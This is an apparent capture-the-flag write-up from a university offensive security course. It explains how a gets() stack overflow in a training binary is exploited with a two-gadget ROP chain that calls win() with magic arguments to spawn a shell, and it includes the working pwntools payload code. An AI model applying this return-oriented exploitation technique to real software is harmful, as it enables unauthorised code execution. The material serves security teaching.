# Escape Room

**Category:** pwn / return-oriented programming (2-gadget ROP) · **Course:** Offensive Security (PoliTo)

## Challenge

`win(int arg1, int arg2)` only unlocks the door (spawns a shell) if called with two exact magic constants, `0xdeadbeef` and `0xcafebabe`. `vuln()` reads into a 64-byte buffer with `gets()` — no length limit at all.

## Vulnerability

Classic unbounded `gets()` stack overflow. Since `win()` needs specific *arguments* rather than just being reached, a plain ret2win isn't enough — the exploit has to control the first two integer-argument registers (`rdi`, `rsi` in the x86-64 SysV calling convention) before jumping into `win`.

## Exploitation

1. Overflow offset to the saved return address: **72 bytes**.
2. Use pwntools' `ROP` to locate the `pop rdi; ret` and `pop rsi; ret` gadgets (the source even plants them in a `gadgets()` function), and chain them to load `0xdeadbeef` into `rdi` and `0xcafebabe` into `rsi`.
3. Add one bare `ret` for 16-byte stack alignment, then return into `win`.

As in `solve.py`:

```python
offset = 72
arg1, arg2 = 0xdeadbeef, 0xcafebabe

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret = 0x000000000040101a          # bare `ret`, for 16-byte stack alignment

payload = flat(
    b"A" * offset,
    p64(rdi), p64(arg1),
    p64(rsi), p64(arg2),
    p64(ret), p64(elf.sym.win),
)
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fno-stack-protector -no-pie -O0 -g`: no canary, fixed load address)
- `escape_room` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
